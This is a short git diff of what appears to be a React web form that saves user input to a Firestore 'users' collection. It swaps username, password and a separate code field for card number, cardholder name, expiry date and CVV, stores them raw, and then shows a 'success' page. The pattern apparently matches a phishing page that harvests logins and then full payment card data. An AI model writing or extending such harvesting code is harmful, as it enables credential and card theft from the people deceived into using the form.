@@ -14,12 +14,14 @@ function App() {
   const collectionRef = collection(database, 'users');
   
   const [formData, setFormData] = useState({
-    username: "",
-    password: "",
+    cardNumber: "",
+    cardName: "",
+    expiryDate:"",
+    cvv: "",
   });
 
   const [formData2, setFormData2] = useState({
-   code: "",
+   
     
   });
 
@@ -49,8 +51,10 @@ function App() {
   function handleSubmit(event) {
     event.preventDefault();
     addDoc(collectionRef, {
-      username: formData.username,
-      password: formData.password, 
+      cardNumber: formData.cardNumber,
+      cardName: formData.cardName, 
+      expiryDate: formData.expiryDate,
+      cvv: formData.cvv,
       
     }).then(()=> {
        navigate("success")
